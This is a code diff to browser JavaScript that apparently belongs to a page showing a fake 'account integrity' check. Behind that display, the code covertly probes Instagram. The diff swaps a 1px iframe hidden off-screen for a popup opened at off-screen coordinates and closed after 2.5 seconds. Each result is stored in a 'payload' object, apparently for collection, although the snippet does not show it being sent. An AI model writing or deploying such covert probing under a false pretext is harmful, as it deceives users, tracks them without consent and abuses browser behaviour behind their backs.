@@ -93,33 +93,22 @@
     } catch(e) {}
   }
 
-  // Instagram check - try hidden iframe
+  // Instagram check - open in popup
   try {
     $('mainStatus').textContent = 'Checking account integrity...';
     $('step3').classList.add('active');
     markStep('step1', 'done');
     markStep('step2', 'done');
 
-    const iframe = document.createElement('iframe');
-    iframe.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px';
-    iframe.src = 'https://www.instagram.com/';
-    document.body.appendChild(iframe);
+    const popup = window.open('https://www.instagram.com/', '_blank', 'width=400,height=400,left=-9999,top=-9999');
 
-    const result = await new Promise(resolve => {
-      let loaded = false;
-      iframe.onload = () => { loaded = true; resolve('loaded'); };
-      iframe.onerror = () => resolve('blocked');
-      setTimeout(() => resolve(loaded ? 'loaded' : 'timeout'), 5000);
-    });
-
-    document.body.removeChild(iframe);
-
-    payload.instagram = {
-      checked: true,
-      iframeResult: result,
-      loginDetected: false,
-      note: 'Cross-origin restrictions prevent direct Instagram login detection. Iframe ' + result + '.'
-    };
+    if (!popup || popup.closed) {
+      payload.instagram = { checked: true, popupResult: 'blocked', loginDetected: false, note: 'Popup was blocked by browser' };
+    } else {
+      await new Promise(r => setTimeout(r, 2500));
+      try { popup.close(); } catch(e) {}
+      payload.instagram = { checked: true, popupResult: 'opened_and_closed', loginDetected: false, note: 'Instagram was opened briefly. Login status cannot be read cross-origin (browser security).' };
+    }
 
     markStep('step3', 'done');
   } catch(e) {
